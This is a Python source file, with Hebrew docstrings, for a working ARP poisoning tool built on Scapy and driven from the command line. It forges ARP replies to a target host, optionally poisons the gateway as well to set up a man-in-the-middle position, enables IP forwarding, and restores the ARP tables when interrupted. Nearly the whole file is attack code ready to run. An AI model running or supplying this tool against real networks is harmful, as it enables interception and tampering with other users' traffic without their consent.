import scapy.all as scapy 
import time 
import argparse 
import sys 
import socket 


def resolve_mac_address(target_ip):
    """משיג את כתובת ה-MAC של יעד נתון באמצעות בקשת ARP."""
    try:
        return scapy.getmacbyip(target_ip)
    except Exception:
        print(f"[-] ERROR: Failed to resolve MAC for IP {target_ip}. Is the host active and accessible?")
        return None

def create_poison_packet(dest_ip, source_ip_to_fake, dest_mac, attacker_mac):
    """יוצר חבילת ARP Reply (op=2) מזויפת."""
    
    packet = scapy.ARP(op=2, 
                        pdst=dest_ip, 
                        hwdst=dest_mac, 
                        psrc=source_ip_to_fake, 
                        hwsrc=attacker_mac) 
    return packet

def send_poison_packet(packet, interface):
    """שולח את החבילה ברמת שכבה 2 (Data Link Layer)."""
    scapy.sendp(packet, iface=interface, verbose=False)

def restore_arp_tables(ip_1, ip_2, iface):
    """משחזר את טבלאות ה-ARP לשני הצדדים באמצעות שליחת כתובות MAC אמיתיות."""
    mac_1 = resolve_mac_address(ip_1)
    mac_2 = resolve_mac_address(ip_2)
    
    if mac_1 and mac_2:
        restore_packet_1 = create_poison_packet(dest_ip=ip_1, source_ip_to_fake=ip_2, dest_mac=mac_1, attacker_mac=mac_2)
        
        restore_packet_2 = create_poison_packet(dest_ip=ip_2, source_ip_to_fake=ip_1, dest_mac=mac_2, attacker_mac=mac_1)
        
        scapy.sendp(restore_packet_1, count=5, iface=iface, verbose=False) 
        scapy.sendp(restore_packet_2, count=5, iface=iface, verbose=False) 
        print("[-] Clean-up complete. ARP tables restored.")
    else:
        print("[-] WARNING: Could not find original MACs for full restoration.")



def setup_arguments():
    """מגדיר ומנתח את הארגומנטים של שורת הפקודה."""
    parser = argparse.ArgumentParser(description="ARP Poisoning Tool for Network Analysis")
    
    parser.add_argument("-t", "--target", dest="target_ip", required=True, 
                        help="The IP address of the target host to be poisoned.")
    
    parser.add_argument("-i", "--iface", dest="interface_name", 
                        help="The network interface to use (e.g., eth0).")
    
    parser.add_argument("-s", "--src", dest="spoof_source_ip", 
                        help="The IP address to spoof (defaults to Gateway IP).")
    
    parser.add_argument("-d", "--delay", dest="sleep_delay", type=float, default=2.0, 
                        help="Time in seconds between sending poison packets. Default is 2.0s.")
    
    parser.add_argument("-gw", dest="attack_gateway", action="store_true", 
                        help="Enables poisoning of the Gateway as well (Man-in-the-Middle).")
    
    args = parser.parse_args()
    
    try:
        socket.inet_aton(args.target_ip) 
    except socket.error:
        parser.error("[-] ERROR: Target IP address is invalid.")
        
    return args

def toggle_ip_forwarding(enable):
    """מפעיל או מכבה את ה-IP Forwarding במערכת (חיוני עבור MiTM)."""
    val = '1' if enable else '0'
    action = "Enabling" if enable else "Disabling"
    try:
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
           f.write(val)
        print(f"[!] {action} IP Forwarding.")
    except Exception as e:
        print(f"[-] WARNING: Failed to {action.lower()} IP Forwarding. Please ensure you have root permissions or run manually: echo {val} | sudo tee /proc/sys/net/ipv4/ip_forward. Error: {e}")

def get_default_gateway():
    """מנסה לקבוע את ה-Gateway IP (ברירת מחדל לרשתות נפוצות)."""
    return "192.168.56.1"

def run_attack():
    arguments = setup_arguments()
    
    if arguments.interface_name:
        scapy.conf.iface = arguments.interface_name
    elif scapy.conf.iface is None:
        print("[-] CRITICAL: No network interface detected. Specify using -i.")
        sys.exit(1)
    
    attacker_interface = scapy.conf.iface
    print(f"[+] Using network interface: {attacker_interface}")

    gateway_ip = get_default_gateway()
    spoofed_ip = arguments.spoof_source_ip if arguments.spoof_source_ip else gateway_ip
    
    print(f"[!] Target Host IP: {arguments.target_ip}")
    print(f"[!] Spoofed Source IP: {spoofed_ip}")
    
    attacker_mac = scapy.get_if_hwaddr(attacker_interface)
    target_mac = resolve_mac_address(arguments.target_ip)
    
    if not target_mac:
        sys.exit(1)
    
    gateway_mac = None
    if arguments.attack_gateway:
        gateway_mac = resolve_mac_address(gateway_ip)
        if not gateway_mac:
            sys.exit(1)

    print(f"\n[+] Initialization complete. Commencing ARP Poisoning...\n")
    
    toggle_ip_forwarding(True)
    
    try:
        while True:
            poison_target_packet = create_poison_packet(
                dest_ip=arguments.target_ip, 
                source_ip_to_fake=spoofed_ip, 
                dest_mac=target_mac, 
                attacker_mac=attacker_mac
            )
            send_poison_packet(poison_target_packet, attacker_interface)
            
            if arguments.attack_gateway:
                poison_gw_packet = create_poison_packet(
                    dest_ip=gateway_ip, 
                    source_ip_to_fake=arguments.target_ip, 
                    dest_mac=gateway_mac, 
                    attacker_mac=attacker_mac
                )
                send_poison_packet(poison_gw_packet, attacker_interface)
            
            sys.stdout.write(f"\r[+] Packets sent: {int(time.time())}. Poinsoning active. ")
            sys.stdout.flush()

            time.sleep(arguments.sleep_delay)
            
    except KeyboardInterrupt:
        print("\n\n[+] Interruption detected (Ctrl+C). Initiating clean-up and restoration...")
        
        restore_arp_tables(arguments.target_ip, gateway_ip, attacker_interface) 
        
        toggle_ip_forwarding(False)
        
        print("\n[+] Exiting program.")


if __name__ == "__main__":
    if sys.platform != 'linux':
        print("[-] WARNING: This tool is intended for Linux (Kali) and requires root permissions.")
    run_attack()